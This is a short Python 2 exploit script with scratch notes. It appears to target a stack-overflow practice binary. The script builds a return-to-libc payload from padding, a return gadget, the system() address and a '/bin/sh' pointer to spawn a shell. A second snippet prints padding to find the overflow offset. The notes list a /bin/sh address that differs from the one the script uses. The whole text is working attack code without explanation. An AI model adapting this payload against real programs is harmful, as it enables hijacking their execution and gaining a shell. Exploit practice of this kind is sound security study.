import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
nop = struct.pack("I", 0x0804853e)
system = struct.pack("I", 0xb7e6b060)
return_after_system = struct.pack("I", 0xb7e5ebe0)
bin_sh = struct.pack("I", 0xb7f8cc58)
print padding + nop + system + return_after_system + bin_sh




struct.pack("I", 0xb7e6b060)

bin/sh addr = 0xbffff6f8

function system addr : 0xb7e6b060 

function p return : 0x0804853e
import struct 
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"
print padding
